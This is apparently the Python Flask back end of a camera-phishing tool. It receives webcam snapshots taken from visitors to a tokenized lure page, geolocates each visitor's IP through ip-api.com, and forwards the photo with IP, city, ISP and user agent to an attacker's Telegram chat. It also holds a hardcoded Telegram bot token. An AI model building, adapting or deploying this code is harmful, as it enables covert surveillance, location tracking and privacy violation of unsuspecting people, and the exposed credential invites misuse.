import os
import json
import base64
import uuid
import threading
import requests
from flask import Flask, request, jsonify, send_from_directory, render_template, make_response

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "9238640840:AAG-WFz-oHToWP6pRm-nuO5nQBpIUB5AInQ")
BASE_URL = os.environ.get("BASE_URL", "http://localhost:5000")

IMG_DIR = "captured_images"
RECV_DIR = "received"
MAP_FILE = "token_map.json"

os.makedirs(IMG_DIR, exist_ok=True)
os.makedirs(RECV_DIR, exist_ok=True)

def load_map():
    if os.path.exists(MAP_FILE):
        try:
            return json.load(open(MAP_FILE))
        except Exception:
            return {}
    return {}

def save_map(m):
    json.dump(m, open(MAP_FILE, "w"))

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/img/<token>.jpg")
def serve_img(token):
    response = make_response(send_from_directory(IMG_DIR, f"{token}.jpg"))
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return response

@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json()
    token = data.get("token")
    image_b64 = data.get("image")
    
    m = load_map()
    chat_id = m.get(token)
    if not chat_id:
        return jsonify({"ok": False, "err": "bad token"}), 400

    header, b64 = image_b64.split(",", 1)
    img_bytes = base64.b64decode(b64)
    fname = f"cap_{uuid.uuid4().hex[:8]}.jpg"
    with open(os.path.join(RECV_DIR, fname), "wb") as f:
        f.write(img_bytes)

    # --- IP & Location Fetch kar rahe hain ---
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()
    
    try:
        ip_info = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        city = ip_info.get('city', 'Unknown')
        country = ip_info.get('country', 'Unknown')
        isp = ip_info.get('isp', 'Unknown')
    except:
        city, country, isp = "Unknown", "Unknown", "Unknown"

    ua = request.headers.get("User-Agent", "")[:100]
    
    # --- Message format banaya ---
    caption_text = (
        f"📸 **New Capture**\n"
        f"🔢 IP: `{ip}`\n"
        f"📍 Location: {city}, {country}\n"
        f"📡 ISP: {isp}\n"
        f"🖥️ UA: {ua}\n"
        f"🔗 Token: `{token}`"
    )

    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
            data={
                "chat_id": chat_id,
                "caption": caption_text,
                "parse_mode": "Markdown"
            },
            files={"photo": (fname, img_bytes, "image/jpeg")},
            timeout=20,
        )
    except Exception as e:
        print("sendPhoto error:", e)

    return jsonify({"ok": True})

# start bot thread
from bot import run_bot

_bot_thread = threading.Thread(target=run_bot, daemon=True)
_bot_thread.start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
